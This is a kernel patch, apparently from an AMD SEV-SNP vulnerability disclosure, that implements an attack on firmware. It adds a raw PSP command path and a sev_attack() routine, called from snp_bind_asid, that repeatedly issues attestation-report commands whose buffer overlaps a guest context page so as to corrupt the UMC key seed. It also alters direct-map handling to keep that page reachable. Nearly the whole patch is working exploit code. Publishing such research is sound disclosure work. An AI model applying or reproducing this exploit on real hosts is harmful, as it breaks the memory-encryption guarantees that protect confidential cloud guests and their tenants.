From b5bee37278d8a9848b2091075788e31f5a5d75a3 Mon Sep 17 00:00:00 2001
From: Tom Dohrmann <erbse.13@gmx.de>
Date: Fri, 8 Dec 2023 13:29:22 +0000
Subject: [PATCH 5/7] implement attack code

See the write-up for more information on what this does.
---
 arch/x86/kvm/svm/sev.c       |  13 +++-
 arch/x86/virt/svm/sev.c      |   5 ++
 drivers/crypto/ccp/sev-dev.c | 114 +++++++++++++++++++++++++++++++++++
 3 files changed, 129 insertions(+), 3 deletions(-)

diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
index 230296549c91..f5445fdd140d 100644
--- a/arch/x86/kvm/svm/sev.c
+++ b/arch/x86/kvm/svm/sev.c
@@ -1965,6 +1965,8 @@ int sev_vm_move_enc_context_from(struct kvm *kvm, unsigned int source_fd)
 	return ret;
 }
 
+#define GUEST_CONTEXT_PAGE_PA 0x2000
+
 /*
  * The guest context contains all the information, keys and metadata
  * associated with the guest that the firmware tracks to implement SEV
@@ -1978,11 +1980,11 @@ static void *snp_context_create(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	int rc;
 
 	/* Allocate memory for context page */
-	context = phys_to_virt(0);
+	context = phys_to_virt(GUEST_CONTEXT_PAGE_PA);
 	if (!context)
 		return NULL;
 
-	rmp_make_private(0, 0, PG_LEVEL_4K, 0, true);
+	rmp_make_private(GUEST_CONTEXT_PAGE_PA >> PAGE_SHIFT, 0, PG_LEVEL_4K, 0, true);
 	
 	data.gctx_paddr = __psp_pa(context);
 	rc = __sev_issue_cmd(argp->sev_fd, SEV_CMD_SNP_GCTX_CREATE, &data, &argp->error);
@@ -1993,11 +1995,17 @@ static void *snp_context_create(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	return context;
 }
 
+void sev_attack(void);
+
 static int snp_bind_asid(struct kvm *kvm, int *error)
 {
 	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
 	struct sev_data_snp_activate data = {0};
 
+	// Corrupt the UMC key seed guest context page, just before the UMC key
+	// seed is installed into the dies.
+	sev_attack();
+
 	data.gctx_paddr = __psp_pa(sev->snp_context);
 	data.asid   = sev_get_asid(kvm);
 	return sev_issue_cmd(kvm, SEV_CMD_SNP_ACTIVATE, &data, error);
@@ -2732,7 +2740,6 @@ static int snp_decommission_context(struct kvm *kvm)
 	up_write(&sev_deactivate_lock);
 
 	/* free the context page now */
-	snp_free_firmware_page(sev->snp_context);
 	sev->snp_context = NULL;
 
 	sev_snp_certs_put(sev->snp_certs);
diff --git a/arch/x86/virt/svm/sev.c b/arch/x86/virt/svm/sev.c
index d42ebed19741..9e34639b0b30 100644
--- a/arch/x86/virt/svm/sev.c
+++ b/arch/x86/virt/svm/sev.c
@@ -400,11 +400,15 @@ int psmash(u64 pfn)
 }
 EXPORT_SYMBOL_GPL(psmash);
 
+
+#define GUEST_CONTEXT_PAGE_PA 0x2000
+
 static int restore_direct_map(u64 pfn, int npages)
 {
 	int i, ret = 0;
 
 	for (i = 0; i < npages; i++) {
+		if (pfn + i == GUEST_CONTEXT_PAGE_PA >> PAGE_SHIFT) continue;
 		ret = set_direct_map_default_noflush(pfn_to_page(pfn + i));
 		if (ret)
 			break;
@@ -422,6 +426,7 @@ static int invalidate_direct_map(u64 pfn, int npages)
 	int i, ret = 0;
 
 	for (i = 0; i < npages; i++) {
+		if (pfn + i == GUEST_CONTEXT_PAGE_PA >> PAGE_SHIFT) continue;
 		ret = set_direct_map_invalid_noflush(pfn_to_page(pfn + i));
 		if (ret)
 			break;
diff --git a/drivers/crypto/ccp/sev-dev.c b/drivers/crypto/ccp/sev-dev.c
index b6eb83bd34ba..77c9dee1a7eb 100644
--- a/drivers/crypto/ccp/sev-dev.c
+++ b/drivers/crypto/ccp/sev-dev.c
@@ -1678,6 +1678,120 @@ static int sev_ioctl_do_get_id2(struct sev_issue_cmd *argp)
 	return ret;
 }
 
+// This is mostly copied from __sev_do_cmd_locked except that we take a
+// physical address instead of a virtual address.
+static int __sev_do_cmd_locked_raw(int cmd, u64 data_pa, int *psp_ret)
+{
+	struct psp_device *psp = psp_master;
+	struct sev_device *sev;
+	unsigned int phys_lsb, phys_msb;
+	unsigned int reg, ret = 0;
+	void *cmd_buf;
+	int buf_len;
+
+	if (!psp || !psp->sev_data)
+		return -ENODEV;
+
+	if (psp_dead)
+		return -EBUSY;
+
+	sev = psp->sev_data;
+
+	buf_len = sev_cmd_buffer_len(cmd);
+	if (WARN_ON_ONCE(!data_pa != !buf_len))
+		return -EINVAL;
+
+	/* Get the physical address of the command buffer */
+	phys_lsb = data_pa ? lower_32_bits(data_pa) : 0;
+	phys_msb = data_pa ? upper_32_bits(data_pa) : 0;
+
+	dev_dbg(sev->dev, "sev command id %#x buffer 0x%08x%08x timeout %us\n",
+		cmd, phys_msb, phys_lsb, psp_timeout);
+
+	print_hex_dump_debug("(in):  ", DUMP_PREFIX_OFFSET, 16, 2, phys_to_virt(data_pa),
+			     buf_len, false);
+
+	iowrite32(phys_lsb, sev->io_regs + sev->vdata->cmdbuff_addr_lo_reg);
+	iowrite32(phys_msb, sev->io_regs + sev->vdata->cmdbuff_addr_hi_reg);
+
+	sev->int_rcvd = 0;
+
+	reg = FIELD_PREP(SEV_CMDRESP_CMD, cmd) | SEV_CMDRESP_IOC;
+	iowrite32(reg, sev->io_regs + sev->vdata->cmdresp_reg);
+
+	/* wait for command completion */
+	ret = sev_wait_cmd_ioc(sev, &reg, psp_timeout);
+	if (ret) {
+		if (psp_ret)
+			*psp_ret = 0;
+
+		dev_err(sev->dev, "sev command %#x timed out, disabling PSP\n", cmd);
+		psp_dead = true;
+
+		return ret;
+	}
+
+	psp_timeout = psp_cmd_timeout;
+
+	if (psp_ret)
+		*psp_ret = FIELD_GET(PSP_CMDRESP_STS, reg);
+
+	if (FIELD_GET(PSP_CMDRESP_STS, reg)) {
+		dev_dbg(sev->dev, "sev command %#x failed (%#010lx)\n",
+			cmd, FIELD_GET(PSP_CMDRESP_STS, reg));
+		ret = -EIO;
+	} else {
+		ret = sev_write_init_ex_file_if_required(cmd);
+	}
+
+	print_hex_dump_debug("(out): ", DUMP_PREFIX_OFFSET, 16, 2, phys_to_virt(data_pa),
+			     buf_len, false);
+
+	return ret;
+}
+
+int __sev_do_cmd_raw(int cmd, u64 data_pa, int *psp_ret) {
+	int rc;
+
+	mutex_lock(&sev_cmd_mutex);
+	rc = __sev_do_cmd_locked_raw(cmd, data_pa, psp_ret);
+	mutex_unlock(&sev_cmd_mutex);
+
+	return rc;
+}
+EXPORT_SYMBOL_GPL(__sev_do_cmd_raw);
+
+#define GUEST_CONTEXT_PAGE_PA 0x2000
+
+// Execute the SEV_CMD_ATTESTATION_REPORT command with the last few bytes of
+// the command buffer overlapping with a GUEST CONTEXT page.
+void sev_attack(void)
+{
+	for (int i = 0; i < 20; i++) {
+		u64 pa = GUEST_CONTEXT_PAGE_PA - (sizeof(struct sev_data_attestation_report)-i);
+		struct sev_data_attestation_report* data = phys_to_virt(pa);
+		int ret;
+		int error = 0;
+
+		memset(data, 0, sizeof(struct sev_data_attestation_report)-i);
+
+		// A page outside the RMP covered area. Not technically needed, but we
+		// need the page to be either in the FIRMWARE or DEFAULT state and we
+		// don't want the firmware to have to check 4GiB worth of pages just
+		// to verify that they're in the FIRMWARE state. It's much easier to
+		// use an address not covered by the RMP that the firmware doesn't have
+		// to do additional checks on.
+		data->address = 0x0000001c4ef00000; 
+
+		data->handle = 1; // This is the handle of the first SEV guest.
+		ret = __sev_do_cmd_raw(SEV_CMD_ATTESTATION_REPORT, pa, &error);
+
+		pr_info("ret: %d, error: %x\n", ret, error);
+		pr_info("data->len: %x\n", data->len);
+	}
+}
+EXPORT_SYMBOL_GPL(sev_attack);
+
 static int sev_ioctl_do_get_id(struct sev_issue_cmd *argp)
 {
 	struct sev_data_get_id *data;
-- 
2.34.1

